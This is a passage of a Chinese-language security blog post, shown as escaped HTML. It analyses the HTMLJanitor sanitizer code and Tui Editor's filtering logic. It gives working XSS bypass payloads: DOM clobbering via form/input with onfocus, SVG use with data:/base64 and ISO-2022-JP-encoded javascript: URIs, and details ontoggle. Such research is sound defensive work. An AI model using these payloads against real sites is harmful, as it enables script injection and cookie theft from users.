class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title class_&#34;&gt;HTMLJanitor&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;prototype&lt;/span&gt;&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;_sanitize&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; (&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;, parentNode&lt;/span&gt;) &amp;#123;                                                                           &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; treeWalker = &lt;span class=&#34;title function_&#34;&gt;createTreeWalker&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;, parentNode);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; node = treeWalker.&lt;span class=&#34;title function_&#34;&gt;firstChild&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!node) &amp;#123; &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (node.&lt;span class=&#34;property&#34;&gt;nodeType&lt;/span&gt; === &lt;span class=&#34;title class_&#34;&gt;Node&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;TEXT_NODE&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// If this text node is just whitespace and the previous or next element&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// sibling is a block element, remove it&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// N.B.: This heuristic could change. Very specific to a bug with&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// `contenteditable` in Firefox: http://jsbin.com/EyuKase/1/edit?js,output&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// &lt;span class=&#34;doctag&#34;&gt;FIXME:&lt;/span&gt; make this an option?&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (node.&lt;span class=&#34;property&#34;&gt;data&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;trim&lt;/span&gt;() === &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;amp;&amp;amp; ((node.&lt;span class=&#34;property&#34;&gt;previousElementSibling&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;title function_&#34;&gt;isBlockElement&lt;/span&gt;(node.&lt;span class=&#34;property&#34;&gt;previousElementSibling&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             || (node.&lt;span class=&#34;property&#34;&gt;nextElementSibling&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;title function_&#34;&gt;isBlockElement&lt;/span&gt;(node.&lt;span class=&#34;property&#34;&gt;nextElementSibling&lt;/span&gt;)))) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      parentNode.&lt;span class=&#34;title function_&#34;&gt;removeChild&lt;/span&gt;(node);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;_sanitize&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;, parentNode);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// Remove all comments&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (node.&lt;span class=&#34;property&#34;&gt;nodeType&lt;/span&gt; === &lt;span class=&#34;title class_&#34;&gt;Node&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;COMMENT_NODE&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parentNode.&lt;span class=&#34;title function_&#34;&gt;removeChild&lt;/span&gt;(node);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;_sanitize&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;, parentNode);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; isInline = &lt;span class=&#34;title function_&#34;&gt;isInlineElement&lt;/span&gt;(node);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; containsBlockElement;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (isInline) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    containsBlockElement = &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;prototype&lt;/span&gt;&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;some&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;call&lt;/span&gt;(node.&lt;span class=&#34;property&#34;&gt;childNodes&lt;/span&gt;, isBlockElement);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// Block elements should not be nested (e.g. &amp;lt;li&amp;gt;&amp;lt;p&amp;gt;...); if&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// they are, we want to unwrap the inner block element.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; isNotTopContainer = !! parentNode.&lt;span class=&#34;property&#34;&gt;parentNode&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; isNestedBlockElement =&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_&#34;&gt;isBlockElement&lt;/span&gt;(parentNode) &amp;amp;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_&#34;&gt;isBlockElement&lt;/span&gt;(node) &amp;amp;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        isNotTopContainer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; nodeName = node.&lt;span class=&#34;property&#34;&gt;nodeName&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;toLowerCase&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; allowedAttrs = &lt;span class=&#34;title function_&#34;&gt;getAllowedAttrs&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;config&lt;/span&gt;, nodeName, node);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; isInvalid = isInline &amp;amp;&amp;amp; containsBlockElement;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// Drop tag entirely according to the whitelist *and* if the markup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// is invalid.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (isInvalid || &lt;span class=&#34;title function_&#34;&gt;shouldRejectNode&lt;/span&gt;(node, allowedAttrs)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      || (!&lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;config&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;keepNestedBlockElements&lt;/span&gt; &amp;amp;&amp;amp; isNestedBlockElement)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Do not keep the inner text of SCRIPT/STYLE elements.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (! (node.&lt;span class=&#34;property&#34;&gt;nodeName&lt;/span&gt; === &lt;span class=&#34;string&#34;&gt;&amp;#x27;SCRIPT&amp;#x27;&lt;/span&gt; || node.&lt;span class=&#34;property&#34;&gt;nodeName&lt;/span&gt; === &lt;span class=&#34;string&#34;&gt;&amp;#x27;STYLE&amp;#x27;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (node.&lt;span class=&#34;property&#34;&gt;childNodes&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;length&lt;/span&gt; &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        parentNode.&lt;span class=&#34;title function_&#34;&gt;insertBefore&lt;/span&gt;(node.&lt;span class=&#34;property&#34;&gt;childNodes&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;], node);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parentNode.&lt;span class=&#34;title function_&#34;&gt;removeChild&lt;/span&gt;(node);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;_sanitize&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;, parentNode);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// Sanitize attributes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; a = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; a &amp;lt; node.&lt;span class=&#34;property&#34;&gt;attributes&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;length&lt;/span&gt;; a += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; attr = node.&lt;span class=&#34;property&#34;&gt;attributes&lt;/span&gt;[a];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_&#34;&gt;shouldRejectAttr&lt;/span&gt;(attr, allowedAttrs, node)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      node.&lt;span class=&#34;title function_&#34;&gt;removeAttribute&lt;/span&gt;(attr.&lt;span class=&#34;property&#34;&gt;name&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;// Shift the array to continue looping.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      a = a - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// Sanitize children&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;_sanitize&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;, node);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ((node = treeWalker.&lt;span class=&#34;title function_&#34;&gt;nextSibling&lt;/span&gt;()));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form id=x tabindex=0 onfocus=alert(document.cookie)&amp;gt;&amp;lt;input id=attributes&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;tui_editor&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tui_editor&#34;&gt;#&lt;/a&gt; Tui_editor&lt;/h2&gt;
&lt;p&gt;常见的 Markdown 渲染器对于 XSS 问题有两种处理方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在渲染的时候格外注意，在写入标签和属性的时候进行实体编码&lt;/li&gt;
&lt;li&gt;渲染时不做任何处理，渲染完成以后再将整个数据作为富文本进行过滤&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;相比起来，后一种方式更加安全（它的安全主要取决于富文本过滤器的安全性）。前一种方式的优势是，不会因为二次过滤导致丢失一些正常的属性，另外少了一遍处理效率肯定会更高，它的缺点是一不注意就可能出问题，另外也不支持直接在 Markdown 里插入 HTML。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4MTQwMDM2NTItZWUzMDYwMjItZTMxMS00N2Y5LWJkYjYtYzAzOWYwN2NmMTNmLm1k&#34;&gt;📎Tui Editor 的 bypass 之路.md&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;过滤过程是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;先正则直接去除注释与 onload 属性的内容&lt;/li&gt;
&lt;li&gt;将上面处理后的内容，赋值给一个新创建的 div 的 innerHTML 属性，建立起一颗 DOM 树&lt;/li&gt;
&lt;li&gt;用黑名单删除掉一些危险 DOM 节点，比如 iframe、script 等&lt;/li&gt;
&lt;li&gt;用白名单对属性进行一遍处理，处理逻辑是
&lt;ul&gt;
&lt;li&gt;只保留白名单里名字&lt;strong&gt;开头&lt;/strong&gt;的属性&lt;/li&gt;
&lt;li&gt;对于满足正则 &lt;code&gt;/href|src|background/i&lt;/code&gt;  的属性，进行额外处理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;处理完成后的 DOM，获取其 HTML 代码返回&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;绕过 1：&lt;/p&gt;
&lt;p&gt;使用 SVG 的 use 标签，use 的作用是引用本页面或第三方页面的另一个 svg 元素，比如：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;circle id=&amp;quot;myCircle&amp;quot; cx=&amp;quot;5&amp;quot; cy=&amp;quot;5&amp;quot; r=&amp;quot;4&amp;quot; stroke=&amp;quot;blue&amp;quot;/&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;use href=&amp;quot;#myCircle&amp;quot;&amp;gt;&amp;lt;/use&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/svg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;use 的 href 属性指向那个被它引用的元素。但与 a 标签的 href 属性不同的是，use href 不能使用 JavaScript 伪协议，但可以使用 data: 协议。&lt;/p&gt;
&lt;p&gt;比如：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;use href=&amp;quot;data:image/svg+xml,&amp;lt;svg id=&amp;#x27;x&amp;#x27; xmlns=&amp;#x27;http://www.w3.org/2000/svg&amp;#x27; xmlns:xlink=&amp;#x27;http://www.w3.org/1999/xlink&amp;#x27; width=&amp;#x27;100&amp;#x27; height=&amp;#x27;100&amp;#x27;&amp;gt;&amp;lt;a xlink:href=&amp;#x27;javascript:alert(1)&amp;#x27;&amp;gt;&amp;lt;rect x=&amp;#x27;0&amp;#x27; y=&amp;#x27;0&amp;#x27; width=&amp;#x27;100&amp;#x27; height=&amp;#x27;100&amp;#x27; /&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/svg&amp;gt;#x&amp;quot;&amp;gt;&amp;lt;/use&amp;gt;&amp;lt;/svg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;data 协议中的文件必须是一个完整的 svg，而且整个 data URL 的末尾，需要有一个锚点 &lt;code&gt;#x&lt;/code&gt;  来指向内部这个被引用的 svg。&lt;/p&gt;
&lt;p&gt;对于 XSS sanitizer 来说，这个 Payload 只有 svg、use 两个标签和 href 一个属性，但因为 use 的引用特性，所以 data 协议内部的 svg 也会被渲染出来。&lt;/p&gt;
&lt;p&gt;data 协议，base64 编码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;use href=&amp;quot;data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyAKICAgIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nMTAwJyBoZWlnaHQ9JzEwMCc+PGEgeGxpbms6aHJlZj0namF2YXNjcmlwdDphbGVydCgxKSc+PHJlY3QgeD0nMCcgeT0nMCcgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnIC8+PC9hPjwvc3ZnPg#x&amp;quot;&amp;gt;&amp;lt;/use&amp;gt;&amp;lt;/svg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;绕过 2：&lt;/p&gt;
&lt;p&gt;ISO-2022-JP 编码&lt;/p&gt;
&lt;p&gt;ISO-2022-JP 编码在解析的时候会忽略 &lt;code&gt;\x1B\x28\x42&lt;/code&gt; ，也就是 &lt;code&gt;%1B%28B&lt;/code&gt; 。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;use href=&amp;quot;data:image/svg+xml;charset=ISO-2022-JP,&amp;lt;svg id=&amp;#x27;x&amp;#x27; xmlns=&amp;#x27;http://www.w3.org/2000/svg&amp;#x27; xmlns:xlink=&amp;#x27;http://www.w3.org/1999/xlink&amp;#x27; width=&amp;#x27;100&amp;#x27; height=&amp;#x27;100&amp;#x27;&amp;gt;&amp;lt;a xlink:href=&amp;#x27;javas%1B%28Bcript:alert(1)&amp;#x27;&amp;gt;&amp;lt;rect x=&amp;#x27;0&amp;#x27; y=&amp;#x27;0&amp;#x27; width=&amp;#x27;100&amp;#x27; height=&amp;#x27;100&amp;#x27; /&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/svg&amp;gt;#x&amp;quot;&amp;gt;&amp;lt;/use&amp;gt;&amp;lt;/svg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;即三种方式&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Chrome ISO-&lt;span class=&#34;number&#34;&gt;2022&lt;/span&gt;-JP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;details ontoggle=&lt;span class=&#34;string&#34;&gt;&amp;quot;alert(1)&amp;quot;&lt;/span&gt;&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
